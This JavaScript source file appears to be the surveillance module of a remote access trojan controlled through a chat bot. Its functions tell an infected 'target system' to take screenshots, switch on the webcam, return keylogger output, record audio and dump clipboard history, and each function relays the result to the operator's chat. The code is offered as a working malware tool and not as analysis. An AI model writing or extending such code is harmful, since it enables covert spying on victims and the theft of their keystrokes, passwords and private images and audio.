import { ResponseFormatter } from '../utils/formatter.js';

/**
 * Surveillance Commands Module
 */

export class SurveillanceCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient;
    this.sock = sock;
  }

  /**
   * Screenshot command
   */
  async screenshot(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('📸 Capturing screenshot...\n\n_Please wait..._') 
    });

    const result = await this.ratClient.getScreenshot(sessionId);
    
    if (result.success) {
      const buffer = Buffer.from(result.image, 'base64');
      await this.sock.sendMessage(chatId, { 
        image: buffer,
        caption: '📸 Screenshot from target system'
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Webcam command
   */
  async webcam(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('📷 Activating webcam...\n\n_Please wait..._') 
    });

    const result = await this.ratClient.getWebcam(sessionId);
    
    if (result.success) {
      const buffer = Buffer.from(result.image, 'base64');
      await this.sock.sendMessage(chatId, { 
        image: buffer,
        caption: '📷 Webcam capture from target'
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Keylogger command
   */
  async keylogs(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const result = await this.ratClient.getKeylogs(sessionId);
    
    if (result.success) {
      const response = ResponseFormatter.header('⌨️', 'KEYLOGGER OUTPUT') + 
                      '\n\n```' + result.data + '```';
      await this.sock.sendMessage(chatId, { text: response });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Audio recording command
   */
  async record(chatId, sessionId, duration) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(`🎤 Recording ${duration} seconds of audio...\n\n_Please wait..._`) 
    });

    const result = await this.ratClient.recordAudio(sessionId, duration);
    
    if (result.success) {
      const buffer = Buffer.from(result.audio, 'base64');
      await this.sock.sendMessage(chatId, { 
        audio: buffer,
        mimetype: 'audio/wav',
        ptt: false,
        caption: `🎤 ${duration} second audio recording`
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Clipboard monitoring command
   */
  async clipboard(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const result = await this.ratClient.getClipboard(sessionId);
    
    if (result.success) {
      try {
        const clipData = JSON.parse(result.data);
        let response = ResponseFormatter.header('📋', 'CLIPBOARD LOGS') + '\n\n';
        
        if (Array.isArray(clipData) && clipData.length > 0) {
          clipData.forEach((item, idx) => {
            response += `\n*[${idx + 1}]* ${item.timestamp}\n\`${item.content}\`\n`;
          });
        } else {
          response += 'No clipboard activity';
        }
        
        await this.sock.sendMessage(chatId, { text: response });
      } catch {
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.info(result.data) 
        });
      }
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }
}